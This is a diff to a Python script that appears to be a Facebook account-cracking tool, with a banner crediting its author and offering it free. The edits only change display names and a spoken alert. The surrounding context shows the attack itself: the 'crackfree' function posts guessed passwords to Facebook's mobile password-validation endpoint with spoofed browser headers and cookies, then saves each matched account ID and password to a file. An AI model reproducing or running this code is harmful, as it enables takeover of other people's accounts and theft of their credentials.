@@ -216,7 +216,7 @@ logo ="""
 \033[0;32m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗ 
 ╠══[Author                   • \033[0;92mSHADHIN AHMED ]  
 ╠══[Facebook                 • \033[0;92mMD SHADHIN ISLAM ]        
-╠══[Github                   • \033[0;92mShadhin-King ]         
+╠══[Github                   • \033[0;92mShadhin-King-999 ]         
 ╠══[Whatsapp                 • \033[0;92m01773452898 ]           
 ╠══[TOOLS                    • \033[0;92mFREE ]            
 ╠══[VERSION                  • \033[0;92m0.1 ]               
@@ -687,8 +687,8 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Shadhin-Co💔] {idf} • {pw}')
-                os.system('espeak -a 300 " Shadhin, Cp,  id,"')
+                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Shadhin-Cp💔] {idf} • {pw}')
+                os.system('espeak -a 300 " Shadhin,  Cp,  id,"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
                 cp+=1
